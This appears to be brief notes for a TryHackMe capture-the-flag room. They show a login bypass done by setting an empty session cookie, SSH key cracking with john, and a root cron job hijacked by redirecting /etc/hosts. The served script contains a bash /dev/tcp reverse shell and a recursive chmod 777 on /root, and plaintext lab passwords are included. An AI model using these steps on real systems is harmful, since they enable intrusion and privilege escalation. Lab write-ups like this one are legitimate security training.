# Initial

Ports 22 and 80 are open

Found `/admin` via gobuster

Found usernames in a `/aboutus`:
```
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security
Bee - Chief Drinking Water Coordinator
MuirlandOracle - Cryptography Consultant
```

# Admin

login.js:
```js
Cookies.set("SessionToken", "")
```

rsa key is in the rsa file

# John

```bash
/opt/john/run/ssh2john.py rsa > forjohn.txt
john forjohn.txt --wordlist=/opt/rockyou.txt
```

passphrase is `f`

# James' password

.overpass: `saydrawnlyingpicture`

In todo.txt: `Ask Paradox how he got the automated build script working and where the builds go`

```bash
cat /etc/crontab

****** root curl overpass.thm/downloads/src/buildscript.sh | bash


-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```
chage local host to your IP


download/scr/buildscript.sh:  (change root permissions)
```bash
chmod -R 777 /root/;
bash -i >& /dev/tcp/your_thm_ip/some_port_to_listen_on 0>&1;
```
```bash
sudo python3 -m http.server 80
```

# Bonus

In folder tryhackme:
password is `gmTDyl`